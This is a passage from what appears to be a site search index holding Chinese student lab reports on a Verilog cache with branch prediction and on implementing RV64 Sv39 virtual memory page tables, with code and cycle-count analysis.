<li>\u7565\u6709\u4e00\u70b9\u4e0d\u540c\u7684\u662f\u5bf9\u4e8e store \u4e3a 1 \u65f6\u7684\u5904\u7406<ul> <li>\u4f46\u5b9e\u9645\u4e0a\u4e5f\u5e76\u6ca1\u6709\u4ec0\u4e48\u533a\u522b</li> <li>recent1 \u4e3a 1 \u65f6\u63a5\u4e0b\u6765\u4f1a\u5199\u5165\u7b2c\u4e8c\u8def\uff0crecent1 \u4e0d\u4e3a 1 \u65f6\u5199\u5165\u7b2c\u4e00\u8def</li> <li>\u56e0\u6b64\u6b64\u65f6\u80af\u5b9a\u5df2\u7ecf\u5b8c\u6210\u4e86\u810f\u6570\u636e\u7684\u5199\u56de\uff0c\u6240\u4ee5\u4e5f\u4e0d\u7528\u50cf\u6846\u67b6\u6ce8\u91ca\u91cc\u5199\u7684\u90a3\u6837\u5206\u5f00\u8ba8\u8bba recent2 \u7684\u503c\u5224\u65ad\u662f replace \u8fd8\u662f place\uff0c\u56e0\u4e3a\u90fd\u4e00\u6837\u7684</li> <li>\u6240\u4ee5\u8fd8\u662f\u7167\u6284\u53e6\u4e00\u8def\u5373\u53ef</li> </ul> </li> </ul>"},{"location":"cs/system/cs3/lab2/#_4","title":"\u5173\u4e8e\u52a8\u6001\u5206\u652f\u9884\u6d4b\u6a21\u5757\u7684\u8865\u5145","text":"<p>\u8fd9\u6b21 cache \u6211\u52a0\u5728 lab1 \u57fa\u7840\u4e0a\u4e86\uff0c\u6240\u4ee5\u5e26\u6709\u5206\u652f\u9884\u6d4b\u7684\u4e1c\u897f\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6700\u540e\u6ca1\u6709\u6b63\u786e\u8df3\u8f6c\uff0c\u56e0\u4e3a BHT \u5728\u6bcf\u6b21\u65f6\u949f\u4e0a\u5347\u6cbf\u90fd\u4f1a\u8fdb\u884c\u66f4\u65b0\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5 00-&gt;01-&gt;11\uff0c\u7136\u540e\u8ba4\u4e3a\u9884\u6d4b\u6b63\u786e\u5c06 refetch \u8bbe\u4e3a\u4e86 0\uff0c\u4f46\u8fd9\u65f6\u5728\u5904\u7406\u7f13\u5b58\u7684\u5185\u5bb9\uff0c\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5b8c\u6210\u4e00\u4e2a\u5b9e\u9645\u7684\u5468\u671f\uff0c\u6240\u4ee5\u8981\u7ed9\u5206\u652f\u9884\u6d4b\u6a21\u5757\u52a0\u4e0a\u6765\u81ea cmu_stall \u4fe1\u53f7\u7684\u8f93\u5165\uff0c\u7136\u540e\u5224\u65ad\u5982\u679c\u8fd9\u4e2a\u4fe1\u53f7\u4e3a 1 \u5219\u4e0d\u66f4\u65b0\u4efb\u4f55\u72b6\u6001\uff1a</p> <pre><code>module Branch_Prediction (\n    ...\n    input           cmu_stall\n);\n    ...\n\n    always @(posedge clk or posedge rst) begin\n        if (~cmu_stall) begin\n            ...\n        end\n    end\nendmodule\n</code></pre> <p>\u4e8e\u662f\u4e4e\u8fd9\u6b21\u5b9e\u9a8c\u7684\u5168\u90e8\u4ee3\u7801\u5c31\u5b8c\u6210\u4e86\u3002</p>"},{"location":"cs/system/cs3/lab2/#_5","title":"\u5b9e\u9a8c\u6d4b\u8bd5\u7ed3\u679c","text":""},{"location":"cs/system/cs3/lab2/#_6","title":"\u4eff\u771f\u6ce2\u5f62","text":"<p>\u9996\u5148\u8bf4\u660e\u4e00\u4e0b\uff0c\u672c\u6b21\u5b9e\u9a8c\u4e3a\u4e86\u5728 mac \u4e0a\u7f16\u5199\u3001\u4eff\u771f\u6d4b\u8bd5\u65b9\u4fbf\uff0c\u4f7f\u7528\u4e86 iverilog-vvp-gtkwave \u8fd9\u5957\u5de5\u5177\u94fe\uff0c\u6ce2\u5f62\u56fe\u770b\u8d77\u6765\u548c vivado \u7684\u7565\u6709\u5dee\u522b\uff0c\u4f46\u7ed3\u679c\u7ecf\u6700\u540e\u6bd4\u5bf9\u662f\u4e00\u81f4\u7684\uff0c\u672c\u62a5\u544a\u4e2d\u7684\u6ce2\u5f62\u56fe\u4e5f\u90fd\u662f\u5728 GTKWave \u4e2d\u67e5\u770b\u7684\uff08\u4e0a\u4f20\u7684\u4ee3\u7801\u4e3a\u4e86\u65b9\u4fbf\u4e5f\u53ea\u5305\u542b\u6709\u6548\u7684\u6e90\u7801\u4ee5\u53ca\u914d\u7f6e\uff09\u3002\u4ee5\u53ca\u56e0\u4e3a\u521a\u5f00\u59cb lab2 \u6846\u67b6\u4ee3\u7801\u5b58\u5728\u4e00\u4e9b\u6570\u636e\u5192\u9669\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u6211\u662f\u76f4\u63a5\u5728 lab1 \u57fa\u7840\u4e0a\u52a0\u7684 cache\uff0c\u6240\u4ee5\u6700\u540e\u6b7b\u5faa\u73af\u8df3\u8f6c\u8fd8\u4f1a\u6709\u4e00\u70b9\u52a8\u6001\u5206\u652f\u9884\u6d4b\u7684\u7ed3\u679c\u5728\u91cc\u9762\u3002</p>"},{"location":"cs/system/cs3/lab2/#cache_5","title":"Cache \u4eff\u771f","text":"<p>\u6574\u4f53\u7684\u6ce2\u5f62\uff1a</p> <p>\u53ef\u4ee5\u770b\u51fa\u603b\u5171\u6d88\u8017\u4e86 128 \u4e2a\u5468\u671f\uff0c\u7b26\u5408\u9884\u671f\uff0c\u5176\u4e2d\u5171\u4e09\u6b21 hit\uff0c\u524d\u56db\u6b21 cache miss \u5199\u5165 cache\uff0c\u7b2c\u4e94\u6b21 miss \u5148\u5199\u56de\u518d\u8bfb\u5165\uff0c\u6d88\u8017\u5468\u671f\u591a\u4e00\u500d\u3002</p> <p>\u63a5\u4e0b\u6765\u8be6\u7ec6\u5206\u6790\u4e09\u79cd\u60c5\u51b5\u7684\u6ce2\u5f62\uff1a</p>"},{"location":"cs/system/cs3/lab2/#miss-clean","title":"miss &amp; clean","text":"<p>\u7b2c\u4e00\u6761\u6307\u4ee4\u5c31\u662f miss \u7684\u60c5\u51b5\uff0cload 0x4 miss\uff0c\u56e0\u6b64\u5c06 0x0 ~ 0xC \u5185\u5bb9\u8bfb\u5165\u7f13\u5b58</p> <p>\u53ef\u89c1\u4e00\u5207\u6b63\u5e38\uff0c\u8bfb\u5165\u4e86\u56db\u6b21 RAM\uff0c\u6d88\u8017\u4e86 4*4\uff08S_FILL\uff09+ 1\uff08S_WAIT\uff09+ 1\uff08S_IDLE\uff09= 18 \u4e2a\u5468\u671f\u3002</p>"},{"location":"cs/system/cs3/lab2/#miss-dirty","title":"miss &amp; dirty","text":"<p>\u7b2c\u516b\u6761\u6307\u4ee4\u7684\u65f6\u5019\u662f miss \u4e14 dirty\uff1a</p> <p>\u56e0\u4e3a\u68c0\u6d4b\u5230\u4e86 miss \u800c\u4e14 dirty\uff0c\u6240\u4ee5 next_state \u53d8\u4e3a\u4e86 S_PRE_BACK\uff0c\u4e00\u4e2a\u5468\u671f\u540e\u53d8\u4e3a\u4e86 S_BACK\uff0c\u5148\u5199\u56de\u4e86\u539f\u6765\u4f4d\u4e8e\u7b2c\u96f6\u7ec4\u7b2c\u4e00\u8def\u7684\u7f13\u5b58\u6570\u636e\uff0c\u7136\u540e\u5199\u5165\u4e86\u65b0\u7684\u6570\u636e\u3002\u6d88\u8017\u4e86 1\uff08S_PRE_BACK\uff09+ 4*4\uff08S_BACK\uff09+ 4*4\uff08S_FILL\uff09+ 1\uff08S_WAIT\uff09+ 1\uff08S_IDLE\uff09= 35 \u4e2a\u5468\u671f\u3002</p>"},{"location":"cs/system/cs3/lab2/#hit","title":"hit","text":"<p>\u7b2c\u4e09\u6761\u548c\u7b2c\u56db\u6761\u662f hit\uff1a</p> <p>\u4e00\u6b21\u662f read hit \u4e00\u6b21\u662f write hit\uff0c\u5747\u53ea\u6d88\u8017 1 \u5468\u671f</p>"},{"location":"cs/system/cs3/lab2/#core","title":"Core \u4eff\u771f","text":"<p>\u9488\u5bf9\u5b8c\u6574 CPU Core \u7684\u4eff\u771f\u6ce2\u5f62\u5982\u4e0b\uff1a</p> <p>\u5bf9\u7167\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u7b2c\u4e00\u6761\u6307\u4ee4 addi \u65e0\u5f71\u54cd\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4 load miss\uff0c\u591a\u6d88\u8017\u4e86 17 \u5468\u671f\u6765\u52a0\u8f7d\u7f13\u5b58\uff0c\u63a5\u4e0b\u6765\u56db\u6761 load \u5747\u4e3a hit\uff0c\u53ef\u89c1\u8fd9\u4e4b\u540e x1~x5 \u5df2\u7ecf\u53d8\u4e3a\u4e86\u9884\u671f\u7684\u503c\u3002\u63a5\u4e0b\u6765\u662f lui \u548c addi \u52a0\u8f7d x1 \u5747\u53ea\u6d88\u8017\u4e00\u4e2a\u5468\u671f\u3002\u7136\u540e store miss\uff0c\u52a0\u8f7d\u4e86 0x000~0x00C\uff0c\u63a5\u7740\u4e24\u6761 store hit\uff0c\u7136\u540e\u4e00\u4e2a load miss\u3002\u63a5\u4e0b\u6765\u518d\u6b21 load miss\uff0c\u4f46\u6b64\u65f6\u6709\u810f\u6570\u636e\uff0c\u6240\u4ee5\u5148\u8fdb\u884c\u4e86\u5199\u56de\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u65f6\u5019 RAM \u7684\u6570\u636e\u53d1\u751f\u4e86\u66f4\u65b0\uff08\u56e0\u4e3a\u524d\u9762\u7684\u4e09\u6761 store\uff09\uff0c\u7136\u540e\u540c\u7406\u52a0\u8f7d\u7f13\u5b58\u3002\u63a5\u4e0b\u6765 load miss \u4f46 clean\uff0c\u591a\u6d88\u8017 17 \u5468\u671f\uff0c\u4e14\u6b64\u65f6 jal \u6307\u4ee4\u5728 ID \u6bb5\uff0c\u5206\u652f\u9884\u6d4b\u6a21\u5757\u8fdb\u884c\u4e86\u5224\u65ad\uff08refetch \u53d8\u4e3a\u4e86 1\uff09\uff0c\u540e\u9762\u6b63\u5e38\u6267\u884c\u4e86 ori \u6307\u4ee4\u540e\u5f00\u59cb\u6b7b\u5faa\u73af\u8df3\u8f6c\uff0c\u4e14\u4e24\u6b21\u4e4b\u540e\u6240\u6709 jal \u5168\u90e8\u6b63\u786e\u9884\u6d4b\uff0c\u4e5f\u7b26\u5408\u9884\u671f\u3002</p>"},{"location":"cs/system/cs3/lab2/#_7","title":"\u4e0a\u677f\u9a8c\u8bc1","text":"<p>\u4e0a\u677f\u6d4b\u8bd5\u4e00\u5207\u6b63\u5e38\u3002</p>"},{"location":"cs/system/cs3/lab2/#_8","title":"\u601d\u8003\u9898","text":"<ol> <li>\u7ed9\u51fa\u672c\u5b9e\u9a8c\u7ed9\u5b9a\u8981\u6c42\u4e0b\u5730\u5740\u5206\u5272\u60c5\u51b5\u7b80\u56fe\uff0c\u8981\u6c42\u6709\u7b80\u8981\u7684\u8ba1\u7b97\u8fc7\u7a0b</li> </ol> <p>\u8fd9\u4e2a\u6846\u67b6\u91cc\u5c31\u6709\u7ed9\uff0c\u4e5f\u4e0d\u592a\u6e05\u695a\u5230\u5e95\u8fd9\u4e2a\u601d\u8003\u9898\u8981\u5e72\u4ec0\u4e48\uff0c\u6709\u4ec0\u4e48\u9700\u8981\u8ba1\u7b97\u7684\u3002</p> <p>\u975e\u8981\u8bf4\u70b9\u4ec0\u4e48\u7684\u8bdd\uff0c\u540e\u4e24\u4e2a\u5b57\u8282\u662f\u7528\u6765\u9488\u5bf9 half word / byte \u8bfb\u53d6\u7684\uff0c\u6240\u4ee5\u662f log2(4) = 2 \u5bbd\u5ea6\uff0c\u63a5\u4e0b\u6765\u662f\u6bcf\u4e2a cache line \u91cc\u56db\u4e2a 32 \u4f4d\u6570\u636e\u7684\u7d22\u5f15\uff0c\u6240\u4ee5\u5bbd\u5ea6\u4e5f\u662f log2(4) = 2\u3002\u63a5\u4e0b\u6765\u662f\u4e8c\u8def\u7ec4\u76f8\u8fde\u7ed3\u6784\u4e2d\u9488\u5bf9\u7ec4\u7684\u7d22\u5f15\uff0c\u4e00\u5171 64 \u4e2a\u5355\u5143\uff0c\u5206\u4e3a\u4e24\u8def\uff0c\u6240\u4ee5\u662f 32 \u7ec4\uff0c\u5bbd\u5ea6\u4e3a log2(32) = 5\u3002\u6700\u540e\u5269\u4e0b\u7684 23 \u4f4d\u5168\u662f tag\u3002\u8fd9\u4e9b\u5728\u524d\u9762\u4e5f\u90fd\u5206\u6790\u8fc7\u554a\u5176\u5b9e\u2026\u2026</p> <ol> <li>\u8bf7\u5206\u6790\u672c\u5b9e\u9a8c\u7684\u6d4b\u8bd5\u4ee3\u7801\u4e2d\u6bcf\u6761\u8bbf\u5b58\u6307\u4ee4\u7684\u547d\u4e2d/\u7f3a\u5931\u60c5\u51b5\uff0c\u5982\u679c\u53d1\u751f\u7f3a\u5931\uff0c\u8bf7\u5224\u65ad\u5176\u7f13\u5b58\u7f3a\u5931\u7684\u7c7b\u522b</li> </ol> <p>\u5b9e\u9a8c\u6d4b\u8bd5\u4ee3\u7801\u5373 mem_test.s\uff0c\u91cc\u9762\u6ce8\u91ca\u5df2\u7ecf\u5206\u6790\u8fc7\u4e86\u5427\uff0c\u90a3\u8fd9\u91cc\u518d\u5199\u4e00\u4e0b\uff1a</p> <ul> <li>1: lb x1, 0x01C(x0)\uff1a\u8bfb miss\uff0c\u5c06 0x010~0x01C \u6570\u636e\u5199\u5165\u7b2c\u4e00\u7ec4\u7b2c\u4e00\u8def</li> <li>2\u30013\u30014\u30015\uff1a\u56db\u6b21\u4ee5\u4e0d\u540c\u5f62\u5f0f\u8bfb\u53d6 0x01C(x0)\uff0c\u5168\u90e8 hit</li> <li>6: lw x0, 0x210(x0)\uff1a\u8bfb miss\uff0c\u5c06 0x210~0x21C \u6570\u636e\u5199\u5165\u7b2c\u4e00\u7ec4\u7b2c\u4e8c\u8def</li> <li>7\u30018 \u4e0d\u662f\u8bbf\u5b58\u6307\u4ee4</li> <li>9: sb x1, 0x0(x0)\uff1a\u5199 miss\uff0c\u5148\u5c06 0x000~0x00C \u6570\u636e\u5199\u5165\u7b2c\u96f6\u7ec4\u7b2c\u4e00\u8def\uff0c\u7136\u540e\u4fee\u6539\u6570\u636e\uff08\u6807\u8bb0\u4e3a\u810f\uff09</li> <li>10\u300111\uff1a\u4e24\u6b21\u5199\u5165\u4e0a\u9762\u8bfb\u8fc7\u7684\u7f13\u5b58\uff0c\u5747 hit\uff0c\u5747\u4fee\u6539\u6570\u636e\uff08\u6807\u8bb0\u4e3a\u810f\uff09</li> <li>12: lw x6, 0x200(x0)\uff1a\u8bfb miss\uff0c\u5c06 0x200~0x20C \u6570\u636e\u5199\u5165\u7b2c\u96f6\u7ec4\u7b2c\u4e8c\u8def</li> <li>13: lw x7, 0x400(x0)\uff1a\u8bfb miss\uff0c\u60f3\u8981\u5199\u5165\u7b2c\u96f6\u7ec4\u7b2c\u4e00\u8def\uff0c\u4f46\u8be5\u8def\u5df2\u7ecf\u5360\u7528\u4e14\u4e3a\u810f\uff0c\u6240\u4ee5\u5148\u5c06 0x000~0x00C \u6570\u636e\u5199\u56de\u5185\u5b58\uff0c\u7136\u540e\u5c06 0x400~0x40C \u6570\u636e\u5199\u5165\u7b2c\u96f6\u7ec4\u7b2c\u4e00\u8def</li> <li>14: lw x8, 0x410(x0)\uff1a\u8bfb miss\uff0c\u60f3\u8981\u5199\u5165\u7b2c\u4e00\u7ec4\u7b2c\u4e00\u8def\uff0c\u8be5\u8def\u88ab\u5360\u7528\u4f46\u4e0d\u810f\uff0c\u6240\u4ee5\u76f4\u63a5\u5c06 0x410~0x41C \u6570\u636e\u5199\u5165\u7b2c\u4e00\u7ec4\u7b2c\u4e00\u8def\u8986\u76d6</li> </ul> <ol> <li>\u5728\u5b9e\u9a8c\u62a5\u544a\u5206\u522b\u5c55\u793a\u7f13\u5b58\u547d\u4e2d\u3001\u4e0d\u547d\u4e2d\u7684\u6ce2\u5f62\uff0c\u5206\u6790\u65f6\u5ef6\u5dee\u5f02</li> </ol> <p>\u6ce2\u5f62\u5206\u6790\u89c1\u4e0a\uff0c\u90fd\u6709\u5206\u6790\u8fc7\u3002</p>"},{"location":"cs/system/cs3/lab3/","title":"RV64 \u865a\u62df\u5185\u5b58\u7ba1\u7406","text":"<p> \u7ea6 1371 \u4e2a\u5b57  162 \u884c\u4ee3\u7801  4 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082023.04.27 ~ 2023.05.11\uff09</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs3/lab3/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u57fa\u4e8e\u7cfb\u7edf\u4e8c lab6 \u4ee3\u7801\u5b9e\u73b0 Sv39 \u865a\u62df\u5185\u5b58\u7ba1\u7406</li> <li>\u5177\u4f53\u8981\u5b9e\u73b0 vm.c \u4e2d\u8981\u6c42\u7684\u529f\u80fd\uff0c\u66f4\u65b0\u5b8c\u5584 head.S mm.c \u7b49</li> <li>\u601d\u8003\u9898<ol> <li>\u9a8c\u8bc1 .text, .rodata \u6bb5\u7684\u5c5e\u6027\u662f\u5426\u6210\u529f\u8bbe\u7f6e\uff0c\u7ed9\u51fa\u622a\u56fe\u3002</li> <li>\u601d\u8003\u7ebf\u6027\u6620\u5c04\u65f6\u80fd\u5426\u4e0d\u5bf9 opensbi \u6240\u5728\u7684\u533a\u57df\u8fdb\u884c\u6620\u5c04\uff0c\u7ed9\u51fa\u4f60\u7684\u7406\u7531\u3002</li> <li>\u4e3a\u4ec0\u4e48\u9700\u8981\u5728\u4fee\u6539\u9875\u8868\u540e\u6267\u884c sfence.vma \u6307\u4ee4\uff1f</li> </ol> </li> </ul>"},{"location":"cs/system/cs3/lab3/#_2","title":"\u865a\u62df\u5185\u5b58\u6620\u5c04\u7684\u5b9e\u73b0","text":""},{"location":"cs/system/cs3/lab3/#_3","title":"\u5efa\u7acb\u4e34\u65f6\u9875\u8868","text":"<p>\u8fd9\u4e00\u6b65\u5185\u8981\u5b9e\u73b0 setup_vm \u51fd\u6570\uff0c\u5728\u5176\u4e2d\u5efa\u7acb\u4e34\u65f6\u9875\u8868\uff0c\u5c06 0x80000000 \u5f00\u59cb\u7684 1GB \u7a7a\u95f4\u6620\u5c04\u5230\u865a\u62df\u5185\u5b58\u9ad8\u5730\u5740\u5904\u3002\u7136\u540e\u4fee\u6539 head.S\uff0c\u5728\u6700\u5f00\u5934\u5c31\u8c03\u7528 setup_vm \u521b\u5efa\u9875\u8868\uff0c\u7136\u540e\u66f4\u65b0 ra sp \u5bc4\u5b58\u5668\u7684\u503c\u5230\u865a\u62df\u5185\u5b58\u7a7a\u95f4\uff0c\u518d\u8bbe\u7f6e satp \u5bc4\u5b58\u5668\u4f7f\u9875\u8868\u751f\u6548\u5e76\u7528 sfence.vma \u5237\u65b0\u3002</p>"},{"location":"cs/system/cs3/lab3/#setup_vm","title":"\u5b9e\u73b0 setup_vm","text":"<p>\u9996\u5148\u5728 defs.h \u91cc\u9762\u6dfb\u52a0\u4e00\u4e9b\u5b8f\u5b9a\u4e49\u65b9\u4fbf\u540e\u7eed\u4f7f\u7528\uff1a</p> <pre><code>// \u6765\u81ea\u5b9e\u9a8c\u624b\u518c\n#define OPENSBI_SIZE (0x200000)\n\n#define VM_START (0xffffffe000000000)\n#define VM_END   (0xffffffff00000000)\n#define VM_SIZE  (VM_END - VM_START)\n\n#define PA2VA_OFFSET (VM_START - PHY_START)\n\n// \u53d6\u51fa\u865a\u62df\u5730\u5740\u4e2d\u7684\u4e09\u4e2a\u865a\u62df\u9875\u53f7\n#define VPN0(va) (((uint64)(va) &gt;&gt; 12) &amp; 0x1ff)\n#define VPN1(va) (((uint64)(va) &gt;&gt; 21) &amp; 0x1ff)\n#define VPN2(va) (((uint64)(va) &gt;&gt; 30) &amp; 0x1ff)\n// \u9875\u8868\u9879\u4e2d\u672b\u5c3e\u7684\u6743\u9650\u4f4d\n#define PTE_V 0x001\n#define PTE_R 0x002\n#define PTE_W 0x004\n#define PTE_X 0x008\n#define PTE_U 0x010\n#define PTE_G 0x020\n#define PTE_A 0x040\n#define PTE_D 0x080\n\n// \u6765\u81ea NJU PA \u5b9e\u9a8c\uff0c\u8f93\u51fa\u66f4\u9192\u76ee\u7684\u8c03\u8bd5\u4fe1\u606f\n#define Log(format, ...) \\\n    printk(\"\\33[1;35m[%s,%d,%s] \" format \"\\33[0m\\n\", \\\n        __FILE__, __LINE__, __func__, ## __VA_ARGS__)\n</code></pre> <p>setup_vm \u51fd\u6570\u9700\u8981\u5148\u6e05\u7a7a early_pgtbl\uff0c\u7136\u540e\u5efa\u7acb\u4e00\u4e2a\u9875\u8868\u9879\u5373\u53ef\u3002</p> <p>\u7531\u4e8e\u8fd9\u91cc\u53ea\u8fdb\u884c 1GB \u7684\u7ebf\u6027\u6620\u5c04\uff0c\u6240\u4ee5\u53d6\u4e2d\u95f4 9 bit \u4f5c\u4e3a index \u5373\u53ef\uff0c\u540e 30 bit \u90fd\u662f\u9875\u5185\u504f\u79fb\u3002\u8fd9\u6837\u4e2d\u95f4\u7684 9 bit \u6b63\u597d\u5bf9\u5e94\u4e86\u4e09\u7ea7\u9875\u8868\u4e2d\u7684 VPN2 \u4f4d\u7f6e\uff0c\u53ef\u4ee5\u4f7f\u7528\u524d\u9762\u7684\u5b8f\u6765\u63d0\u53d6\u3002\u9875\u8868\u9879\u7684\u5185\u5bb9\u4e5f\u662f\u53ea\u8bbe\u7f6e PPN2 \u5bf9\u5e94\u7684\u4f4d\u7f6e\u5c31\u53ef\u4ee5\uff08\u4e5f\u5c31\u662f 28 \u4f4d\u53ca\u4ee5\u4e0a\uff09\uff0c\u6700\u540e\u7684\u6743\u9650\u4f4d\u8bbe\u7f6e\u4e3a V | R | W | X\uff1a</p> <pre><code>void setup_vm(void) {\n    memset(early_pgtbl, 0x0, PGSIZE);\n    uint64 pa = PHY_START, va = VM_START;\n    int index = VPN2(va);\n    early_pgtbl[index] = (((pa &gt;&gt; 30) &amp; 0x3ffffff) &lt;&lt; 28) | PTE_V | PTE_R | PTE_W | PTE_X;\n}\n</code></pre>"},{"location":"cs/system/cs3/lab3/#_4","title":"\u542f\u7528\u4e34\u65f6\u9875\u8868","text":"<p>\u6839\u636e\u6307\u5bfc\uff0c\u4fee\u6539 head.S \u4e2d _start \u5f00\u5934\u4e3a\uff1a</p> <pre><code>_start:\n    la sp, boot_stack_top\n\n    call setup_vm\n    call relocate\n\n    call mm_init\n    ...\n</code></pre> <p>\u7136\u540e\u5728 relocate \u4e2d\u5b9e\u73b0\u5bf9\u4e8e ra sp \u7684\u66f4\u65b0\u3001satp \u7684\u8bbe\u7f6e\u4ee5\u53ca TLB \u7684\u5237\u65b0\uff1a</p> <pre><code>relocate:\n    li t0, 0xffffffdf80000000 # PA2VA_OFFSET\n    add ra, ra, t0\n    add sp, sp, t0\n\n    # set satp with early_pgtbl\u2018s physical address\n\n    la t0, early_pgtbl\n    li t1, 8\n    slli t1, t1, 60     # mode \u90e8\u5206\u8bbe\u7f6e\u4e3a 8\n    srli t0, t0, 12     # PPN \u90e8\u5206\u8bbe\u7f6e\u4e3a\u9875\u8868\u7269\u7406\u5730\u5740\u53f3\u79fb 12 \u4f4d\n    or t0, t0, t1\n    csrw satp, t0\n\n    # flush tlb\n    sfence.vma zero, zero\n\n    ret\n</code></pre> <p>\u8fd9\u4e4b\u540e make run \u4e5f\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002</p>"},{"location":"cs/system/cs3/lab3/#_5","title":"\u5efa\u7acb\u6b63\u5f0f\u9875\u8868","text":"<p>\u8fd9\u4e00\u90e8\u5206\u8981\u5efa\u7acb\u6b63\u5f0f\u7684\u4e09\u7ea7\u9875\u8868\uff0c\u4ee5 page \u4e3a\u5355\u4f4d\u521b\u5efa\u6620\u5c04\u5e76\u8bbe\u7f6e\u6743\u9650\u3002\u5e76\u4e14\u521b\u5efa\u9875\u8868\u7684\u65f6\u5019\u4f1a\u7533\u8bf7\u5185\u5b58\uff0c\u5728 mm_init \u51fd\u6570\u4e2d\u8981\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u5c06\u53ef\u7528\u5730\u5740\u4fee\u6539\u4e3a\u865a\u62df\u5185\u5b58\u5730\u5740\uff1a</p> <pre><code>void mm_init(void) {\n    kfreerange(_ekernel, (char *)(PHY_END+PA2VA_OFFSET));\n    Log(\"...mm_init done!\");\n}\n</code></pre> <p>setup_vm_final \u51fd\u6570\u4e2d\u9488\u5bf9 .text \u6bb5\u3001.rodate \u6bb5\u548c\u5269\u4f59\u90e8\u5206\u5206\u522b\u8fdb\u884c\u6620\u5c04\uff0c\u8bbe\u7f6e\u4e0d\u540c\u7684\u6743\u9650\u3002\u6bcf\u6b21\u6620\u5c04\u8c03\u7528\u4e86 create_mapping \u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f\u6839\u9875\u8868\u5730\u5740\uff0c\u7136\u540e\u662f\u6620\u5c04\u5f00\u59cb\u7684\u865a\u62df\u5730\u5740\u3001\u7269\u7406\u5730\u5740\u4ee5\u53ca\u5927\u5c0f\uff0c\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u662f\u6743\u9650\u3002\u6240\u4ee5\u53ef\u4ee5\u5148\u6765\u5b9e\u73b0 setup_vm_final \u518d\u6765\u5b9e\u73b0\u5185\u90e8\u7684 create_mapping\u3002</p>"},{"location":"cs/system/cs3/lab3/#setup_vm_final","title":"\u5b9e\u73b0 setup_vm_final","text":"<p>\u540c\u6837\u6e05\u7a7a\u8fd9\u90e8\u5206\u9875\u7a7a\u95f4\uff0c\u7136\u540e\u9010\u4e2a\u6bb5\u8bbe\u7f6e\u6620\u5c04\u3002\u8fd9\u91cc\u4fee\u6539\u4e86\u4e00\u4e0b\u6307\u5bfc\u4e2d\u7684\u4ee3\u7801\uff1a</p> <pre><code>extern char _stext[];\nextern char _srodata[];\nextern char _sdata[];\nextern char _sbss[];\n</code></pre> <p>\u7136\u540e\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e9b\u7b26\u53f7\u5c31\u53ef\u4ee5\u8868\u793a\u6bb5\u8d77\u59cb\u5730\u5740\u4e86\u3002</p> <ul> <li>\u8bbe\u7f6e text \u6bb5\uff08\u53ef\u8bfb\u53ef\u6267\u884c\uff09     <pre><code>uint64 va = VM_START + OPENSBI_SIZE;\nuint64 pa = PHY_START + OPENSBI_SIZE;\ncreate_mapping(swapper_pg_dir, va, pa, _srodata - _stext, PTE_X | PTE_R | PTE_V);\n</code></pre></li> <li>\u8bbe\u7f6e rodata \u6bb5\uff08\u53ef\u8bfb\uff09     <pre><code>va += _srodata - _stext;\npa += _srodata - _stext;\ncreate_mapping(swapper_pg_dir, va, pa, _sdata - _srodata, PTE_R | PTE_V);\n</code></pre></li> <li>\u8bbe\u7f6e\u5269\u4f59\u90e8\u5206\uff08\u53ef\u8bfb\u53ef\u5199\uff09     <pre><code>va += _sdata - _srodata;\npa += _sdata - _srodata;\ncreate_mapping(swapper_pg_dir, va, pa, PHY_SIZE - (_sdata - _stext), PTE_W | PTE_R | PTE_V);\n</code></pre></li> <li>\u8ba1\u7b97 satp \u5bc4\u5b58\u5668\u7684\u503c\u5e76\u5199\u5165     <pre><code>// \u8fd9\u91cc\u8981\u8ba1\u7b97\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\uff0c\u7136\u540e\u53f3\u79fb\nuint64 _satp = (((uint64)(swapper_pg_dir) - PA2VA_OFFSET) &gt;&gt; 12) | (8L &lt;&lt; 60);\ncsr_write(satp, _satp);\nLog(\"set satp to %lx\", _satp);\n</code></pre></li> <li>\u5237\u65b0 TLB \u5e76\u8fd4\u56de     <pre><code>asm volatile(\"sfence.vma zero, zero\");\nreturn;\n</code></pre></li> </ul>"},{"location":"cs/system/cs3/lab3/#create_mapping","title":"\u5b9e\u73b0 create_mapping","text":"<p>\u8981\u9010\u9875\u6dfb\u52a0\u6620\u5c04\uff0c\u6240\u4ee5\u57fa\u672c\u6846\u67b6\u4e3a\uff1a</p> <pre><code>void create_mapping(uint64 *pgtbl, uint64 va, uint64 pa, uint64 sz, int perm) {\n    Log(\"root: %lx, [%lx, %lx) -&gt; [%lx, %lx), perm: %x\", pgtbl, pa, pa+sz, va, va+sz, perm);\n    uint64 va_end = va + sz;\n    uint64 *now_tbl, now_vpn, now_pte;\n    while (va &lt; va_end) {\n        ...\n        va += PGSIZE;\n        pa += PGSIZE;\n    }\n}\n</code></pre> <p>\u5176\u4e2d\u7701\u7565\u53f7\u7684\u90e8\u5206\u8981\u5b9e\u73b0\u4e09\u7ea7\u9875\u8868\u7684\u67e5\u8be2\uff0c\u5982\u679c\u4e0d\u5b58\u5728\uff08PTE_V \u4f4d\u4e0d\u4e3a 1\uff09\u5219\u5206\u914d\u65b0\u7684\u4e00\u9875\u6765\u5b58\u653e\u3002</p> <ul> <li>\u7b2c\u4e00\u7ea7<ul> <li>\u4ece\u6839\u9875\u8868\u53d6\u51fa\u7b2c\u4e00\u7ea7 PTE\uff0c\u4ee5\u53ca\u865a\u62df\u5730\u5740\u5bf9\u5e94\u7684 VPN2     <pre><code>now_tbl = pgtbl;\nnow_vpn = VPN2(va);\nnow_pte = *(now_tbl + now_vpn);\n</code></pre></li> 